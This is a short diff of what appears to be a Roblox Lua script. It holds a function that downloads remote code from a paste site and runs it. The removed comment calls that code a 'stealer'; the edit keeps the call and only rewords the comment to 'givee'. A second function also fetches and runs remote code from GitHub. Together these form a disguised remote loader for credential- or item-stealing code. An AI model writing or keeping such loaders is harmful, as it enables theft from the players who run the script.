@@ -1,5 +1,5 @@
 local function sigma()
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/jkyQlFMWu0/0", true))() -- replace with actual stealer
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/jkyQlFMWu0/0", true))() -- replace with actual givee
 end
 local function loadui()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Scripty/refs/heads/main/Admz.lua"))()
